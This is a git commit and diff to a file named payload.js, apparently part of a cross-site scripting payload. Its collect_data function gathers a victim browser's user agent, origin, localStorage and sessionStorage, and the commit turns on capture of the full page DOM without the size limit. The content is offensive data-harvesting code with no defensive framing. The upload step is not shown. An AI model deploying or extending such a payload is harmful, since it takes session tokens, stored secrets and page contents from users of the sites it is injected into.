2c8f519b89f264c07e716b9fecfb897a45befa4c
Rotem Reiss <reiss.r@gmail.com>
2020-11-03 00:16:23 +0200

    Return the DOM after raising the limits

--- payload.js
+++ payload.js
@@ -29,7 +29,7 @@ function collect_data() {
     try { collected_data["User-Agent"] = return_value(navigator.userAgent); } catch(e) {}
     try { collected_data["Browser Time"] = return_value(new Date().toTimeString()); } catch(e) {}
     try { collected_data["Origin"] = return_value(location.origin); } catch(e) {}
-    // try { collected_data["DOM"] = return_value(document.documentElement.outerHTML); } catch(e) {}
+    try { collected_data["DOM"] = return_value(document.documentElement.outerHTML); } catch(e) {}
     // collected_data["DOM"] = collected_data["DOM"].slice(0, 4096)
     try { collected_data["localStorage"] = return_value(localStorage.toSource()); } catch(e) {}
     try { collected_data["sessionStorage"] = return_value(sessionStorage.toSource()); } catch(e) {}
